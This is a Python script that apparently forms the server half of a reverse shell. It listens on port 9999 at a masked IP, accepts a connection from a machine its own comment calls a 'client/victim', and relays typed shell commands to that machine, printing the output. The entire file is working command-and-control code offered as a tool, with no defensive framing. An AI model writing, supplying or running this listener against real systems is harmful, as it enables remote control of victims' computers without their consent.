import socket
import sys

# Create a socket(connect two computer)
def create_socket():
	try:
		global host
		global port
		global s
		host="###.###.##.###"
		port=9999
		s=socket.socket()
		print("Socket created")

	except socket.error as msg:
		print("Socket creation error: "+ str(msg))

# Binding the socket and listening for connection

def bind_socket():
	try:
		global host
		global port
		global s

		print("Binding the Port "+str(port))

		s.bind((host, port))
		s.listen(5)

	except socket.error as msg:
		print("Socket creation error: "+ str(msg)+ "\n"+ "Retrying")
		bind_socket()

# Establish connection with a client (socket must be listening)

def socket_accept():
	conn,address=s.accept()
	print("connection has been established! |"+" IP "+address[0]+ "| port "+str(address[1]))
	send_commands(conn)
	conn.close()

# Sending commands to client/victim or a friend

def send_commands(conn):
	while True:
		cmd = input()
		if cmd=='quit':
			conn.close()
			s.close()
			sys.exit()
		if len(str.encode(cmd))>0:
			conn.send(str.encode(cmd))
			client_response = str(conn.recv(1024),"utf-8")
			print(client_response,end="")

# Main funtion to call above functions

def main():
	create_socket()
	bind_socket()
	socket_accept()

main()
